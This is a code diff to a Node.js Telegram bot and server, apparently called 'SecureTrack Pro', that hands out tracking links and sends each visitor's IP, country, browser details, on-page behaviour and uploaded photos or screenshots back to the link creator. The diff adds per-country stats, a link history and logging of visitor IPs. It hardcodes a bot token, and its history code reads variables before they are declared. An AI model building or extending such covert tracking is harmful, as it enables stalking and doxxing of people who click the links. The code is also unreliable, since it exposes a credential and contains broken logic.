@@ -11,7 +11,7 @@ const fs = require('fs');
 const path = require('path');
 
 const BOT_TOKEN = '8746785573:AAEnt4gMMRPZLgiqPhuNncH9k0Y_6T3FtZs';
-const ADMIN_CHAT_ID = '246025432'; // Admin principal
+const ADMIN_CHAT_ID = '7657446462'; // ✅ Tu ID de Telegram
 
 // Configuración del servidor
 const PORT = Number(process.env.PORT) || 8080;
@@ -28,6 +28,8 @@ let startTime = new Date();
 // Base de datos en memoria para asociar Links con Usuarios
 // Formato: { "V-123456": "ID_DEL_CHAT_DEL_USUARIO" }
 const linkDatabase = {};
+const linkHistory = []; // Historial de enlaces generados
+const visitorStats = {}; // Estadísticas por país
 
 const app = express();
 app.use(cors());
@@ -55,9 +57,14 @@ async function apiFetch(method, body = {}) {
             signal: controller.signal,
         });
         clearTimeout(timer);
-        return await res.json();
+        const json = await res.json();
+        if (!json.ok) {
+            console.error(`[TG API ERROR] ${method}:`, json.description || json.error_code);
+        }
+        return json;
     } catch (e) {
         clearTimeout(timer);
+        console.error(`[FETCH ERROR] ${method}:`, e.message);
         return null;
     }
 }
@@ -97,6 +104,9 @@ async function handleCommand(msg) {
     const chatId = String(msg.chat.id);
     const text = (msg.text || '').trim();
     const from = msg.from?.first_name || 'Usuario';
+    
+    // MOSTRAR CHAT_ID PARA DEBUGGING
+    console.log(`\n[📨 MENSAJE RECIBIDO]\n👤 Usuario: ${from}\n🔑 CHAT_ID: ${chatId}\n💬 Texto: ${text}\n`);
 
     // Opcional: Si quieres que solo el admin pueda usarlo, descomenta esto:
     // if (chatId !== ADMIN_CHAT_ID) return;
@@ -122,11 +132,20 @@ Hola <b>${from}</b>! Bienvenido al panel de rastreo.
 
         let target = text.split(' ').slice(1).join(' ').trim();
         if (!target) {
-            target = `V-${Math.floor(Date.now() / 1000).toString().slice(-6)}`;
+            // Genera ID más corto y legible: VA1B, VX2C, etc.
+            target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
         }
 
         // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
         linkDatabase[target] = chatId;
+        
+        // Guardar en historial
+        linkHistory.push({
+            id: target,
+            createdAt: new Date().toLocaleString('es-ES'),
+            owner: from,
+            shortUrl: shortUrl || longUrl
+        });
 
         const longUrl = buildTrackingUrl(target);
         const shortUrl = await shortenUrl(longUrl);
@@ -152,8 +171,44 @@ Hola <b>${from}</b>! Bienvenido al panel de rastreo.
 🟢 Bot: <b>Online</b>
 ⏱️ Uptime: <b>${uptime}</b>
 👁️ Visitas totales: <b>${visitCount}</b>
-🔗 Links activos en memoria: <b>${Object.keys(linkDatabase).length}</b>`
+🔗 Links activos: <b>${Object.keys(linkDatabase).length}</b>
+📋 Enlaces generados: <b>${linkHistory.length}</b>`
         );
+
+        /* ── /stats ────────────────────────────────────── */
+    } else if (text === '/stats') {
+        const uptime = getUptime();
+        const topCountries = Object.entries(visitorStats)
+            .sort((a, b) => b[1] - a[1])
+            .slice(0, 5)
+            .map(([country, count]) => `  ${getFlagEmoji(country)} ${country}: <b>${count}</b>`)
+            .join('\n');
+
+        await sendMessage(chatId,
+            `📈 <b>Estadísticas Detalladas</b>
+
+🌐 <b>General:</b>
+⏱️ Uptime: <b>${uptime}</b>
+👁️ Visitas totales: <b>${visitCount}</b>
+🔗 Enlaces generados: <b>${linkHistory.length}</b>
+
+🏆 <b>Top 5 Países:</b>
+${topCountries || '  📊 Sin datos aún'}`
+        );
+
+        /* ── /history ────────────────────────────────────── */
+    } else if (text === '/history') {
+        const recent = linkHistory.slice(-10).reverse();
+        if (recent.length === 0) {
+            await sendMessage(chatId, '📋 <b>Historial Vacío</b>\n\nNo hay enlaces generados aún.');
+        } else {
+            const list = recent.map((link, i) => 
+                `${i + 1}. <code>${link.id}</code> — ${link.createdAt}`
+            ).join('\n');
+            await sendMessage(chatId,
+                `📋 <b>Últimos 10 Enlaces Generados</b>\n\n${list}`
+            );
+        }
 
         /* ── /help ──────────────────────────────────────── */
     } else if (text === '/help') {
@@ -161,13 +216,15 @@ Hola <b>${from}</b>! Bienvenido al panel de rastreo.
             `📖 <b>Comandos SecureTrack Pro</b>
 
 🎯 <b>Generar Enlaces:</b>
-/gps — Genera link corto para enviar
+/gps — Genera link corto aleatorio
 /gps [nombre] — Genera link con etiqueta personalizada
 
-📋 <b>Sistema:</b>
-/start — Menú principal
-/status — Estado del sistema y estadísticas
-/help — Esta ayuda`
+📊 <b>Estadísticas:</b>
+/status — Estado del sistema
+/stats — Estadísticas detalladas por país
+/history — Últimos enlaces generados
+
+ℹ️ /help — Esta ayuda`
         );
     }
 }
@@ -203,6 +260,13 @@ app.post('/api/report', async (req, res) => {
     const targetId = data.targetId || 'Visitante Anónimo';
     const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID; // Si no existe el ID, va al admin por defecto
 
+    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat: ${ownerChatId} | LinkDB:`, Object.keys(linkDatabase));
+    console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);
+    
+    // Registrar estadísticas de países
+    const country = data.geo?.country || 'Desconocido';
+    visitorStats[country] = (visitorStats[country] || 0) + 1;
+    
     const ts = new Date(data.timestamp).toLocaleString('es-ES', { timeZone: data.browser?.timezone || 'UTC' });
     const g = data.geo;
     const b = data.browser;
@@ -275,14 +339,19 @@ ${flag} País:          ${g.country} (${g.countryCode})
 🔗 Referrer:       ${data.referrer}
 📄 URL:            ${data.pageUrl}${data.eventType === 'CLICK_CTA_BUTTON' ? `\n⏱️ Tiempo en página: ${data.timeOnPage}s\n📜 Scroll max:       ${data.scrollPct}%` : ''}`;
 
-    await sendMessage(ownerChatId, messageHtml);
+    const msgResult = await sendMessage(ownerChatId, messageHtml);
+    if (msgResult?.ok) {
+        console.log(`[✅ MENSAJE ENVIADO] A chat ${ownerChatId}`);
+    } else {
+        console.error(`[❌ FALLO AL ENVIAR] A chat ${ownerChatId} | Respuesta:`, msgResult);
+    }
     res.json({ success: true });
 });
 
 // Recibe la foto (screenshot) y la reenvía a Telegram
 app.post('/api/photo', upload.single('photo'), async (req, res) => {
-    const ownerChatId = req.body.chat_id || req.body.ownerChatId || ADMIN_CHAT_ID;
     const targetId = req.body.targetId || 'Desconocido';
+    const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID;
 
     if (req.file) {
         try {
